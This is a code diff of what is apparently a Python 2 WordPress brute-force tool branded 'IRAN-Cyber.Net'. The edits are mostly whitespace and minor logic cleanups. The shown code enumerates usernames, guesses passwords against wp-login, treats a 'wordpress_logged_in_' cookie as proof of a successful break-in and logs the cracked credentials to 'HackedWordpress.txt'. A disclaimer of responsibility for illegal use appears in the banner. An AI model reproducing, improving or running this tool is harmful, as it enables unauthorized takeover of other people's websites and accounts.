@@ -8,7 +8,6 @@ except ImportError:
     print '   [-] you need to install requests Module'
     sys.exit()
 
-
 '''
              White Hat Hacker
  __          _______  ____             _       
@@ -18,10 +17,12 @@ except ImportError:
     \  /\  /  | |    | |_) | |  | |_| | ||  __/
      \/  \/   |_|    |____/|_|   \__,_|\__\___|
        IRAN-Cyber.Net           github.com/04x  
-                                               
+
      Note! : We don't Accept any responsibility for any illegal usage.    
 
 '''
+
+
 class WordPress_priv8Bf(object):
     def __init__(self):
         self.flag = 0
@@ -42,7 +43,7 @@ class WordPress_priv8Bf(object):
             site = site.replace('https://', '')
         else:
             pass
-        print self.c + '    [' + self.y + '+' + self.c + '] ' + self.w + ' START BruteForce Process: '\
+        print self.c + '    [' + self.y + '+' + self.c + '] ' + self.w + ' START BruteForce Process: ' \
               + self.c + site
         try:
             agent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
@@ -80,11 +81,11 @@ class WordPress_priv8Bf(object):
         else:
             WpSubmitValue = WpSubmitValue
         usgen = self.UserName_Enumeration(site)
-        if usgen != '' or usgen != None:
+        if usgen != None:
             Username = usgen
             time.sleep(1)
             print self.c + '       [' + self.y + '+' + self.c + ']' + self.w + \
-                  ' Enumeration Username:  ' + self.g + str(Username)  + self.g + ' [OK]'
+                  ' Enumeration Username:  ' + self.g + str(Username) + self.g + ' [OK]'
         else:
             try:
                 Username = raw_input(self.c + '       [' + self.y + '*' + self.c + ']' + self.w +
@@ -144,7 +145,7 @@ class WordPress_priv8Bf(object):
             \  /\  /  | |    | |_) | |  | |_| | ||  __/
              \/  \/   |_|    |____/|_|   \__,_|\__\___|
                IRAN-Cyber.Net           github.com/04x  
-                                                       
+
              Note! : We don't Accept any responsibility for any illegal usage.        
     """
         for N, line in enumerate(x.split("\n")):
@@ -195,7 +196,7 @@ class WordPress_priv8Bf(object):
               ' Testing: ' + self.y + passwd
         if 'wordpress_logged_in_' in str(GoT.cookies):
             print self.c + '       [' + self.y + '+' + self.c + '] ' + \
-                  self.y + site + ' ' + self.y + 'username: ' + self.g\
+                  self.y + site + ' ' + self.y + 'username: ' + self.g \
                   + Username + self.y + ' Password: ' + self.g + passwd
             with open('HackedWordpress.txt', 'a') as writer:
                 writer.write('http://' + site + '/wp-login.php' + '\n Username: admin' + '\n Password: ' +
